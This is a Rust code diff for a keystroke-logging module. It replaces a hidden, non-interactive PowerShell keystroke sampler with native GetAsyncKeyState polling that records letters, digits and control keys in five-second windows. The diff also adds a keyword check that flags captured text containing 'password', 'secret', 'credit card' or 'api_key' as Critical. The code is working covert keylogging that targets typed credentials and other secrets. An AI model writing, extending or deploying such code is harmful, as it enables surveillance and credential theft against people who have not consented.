@@ -22,10 +22,18 @@ pub fn flush_keystroke_buffer() -> Option<Value> {
     }
     let chunk = buf.join("");
     buf.clear();
+
+    let lower_chunk = chunk.to_lowercase();
+    let keywords = ["password", "confidential", "secret", "credit card", "api_key"];
+    let is_alert = keywords.iter().any(|k| lower_chunk.contains(k));
+    let severity = if is_alert { "Critical" } else { "Low" };
+
     Some(json!({
         "Type":      "KeystrokeLog",
         "Details":   chunk,
         "Timestamp": chrono::Utc::now().to_rfc3339(),
+        "IsAlert":   is_alert,
+        "Severity":  severity,
     }))
 }
 
@@ -48,49 +56,44 @@ pub fn sample_keystrokes() {
 
 #[cfg(target_os = "windows")]
 fn sample_windows() {
-    let script = r#"
-$ErrorActionPreference = 'SilentlyContinue'
-Add-Type -AssemblyName System.Windows.Forms
+    use std::time::Instant;
+    use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
 
-# Map VK codes 32-90 to readable chars
-$keyMap = @{
-    32='[Space]'; 8='[Back]'; 13='[Enter]'; 9='[Tab]'
-    27='[Esc]'; 46='[Del]'; 37='[Left]'; 38='[Up]'; 39='[Right]'; 40='[Down]'
-}
-for ($k = 48; $k -le 57; $k++) { $keyMap[$k] = [char]$k }
-for ($k = 65; $k -le 90; $k++) { $keyMap[$k] = [char]$k }
+    let end_time = Instant::now() + std::time::Duration::from_secs(5);
+    let mut result = String::new();
+    
+    // Map of common keys (simple naive implementation like the PS script)
+    let keys = vec![
+        (32, "[Space]"), (8, "[Back]"), (13, "[Enter]"), (9, "[Tab]"),
+        (27, "[Esc]"), (46, "[Del]"), (37, "[Left]"), (38, "[Up]"), 
+        (39, "[Right]"), (40, "[Down]")
+    ];
 
-$result  = ''
-$endTime = [DateTime]::UtcNow.AddSeconds(5)
-
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class KeySampler {
-    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
-}
-"@
-
-while ([DateTime]::UtcNow -lt $endTime) {
-    foreach ($vk in $keyMap.Keys) {
-        $state = [KeySampler]::GetAsyncKeyState($vk)
-        if ($state -band 1) {
-            $result += $keyMap[$vk]
-        }
-    }
-    Start-Sleep -Milliseconds 50
-}
-Write-Output $result
-"#;
-    if let Ok(out) = crate::hidden_command!("powershell")
-        .args(&["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", script])
-        .output()
-    {
-        let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
-        if !text.is_empty() {
-            if let Ok(mut buf) = BUFFER.lock() {
-                buf.push(text);
+    while Instant::now() < end_time {
+        unsafe {
+            for (vk, name) in &keys {
+                if (GetAsyncKeyState(*vk as i32) as u16 & 0x8000) != 0 {
+                    result.push_str(name);
+                }
             }
+            // A-Z and 0-9
+            for vk in 48..=57 {
+                if (GetAsyncKeyState(vk) as u16 & 0x8000) != 0 {
+                    result.push(vk as u8 as char);
+                }
+            }
+            for vk in 65..=90 {
+                if (GetAsyncKeyState(vk) as u16 & 0x8000) != 0 {
+                    result.push(vk as u8 as char);
+                }
+            }
+        }
+        std::thread::sleep(std::time::Duration::from_millis(50));
+    }
+    
+    if !result.is_empty() {
+        if let Ok(mut buf) = BUFFER.lock() {
+            buf.push(result);
         }
     }
 }
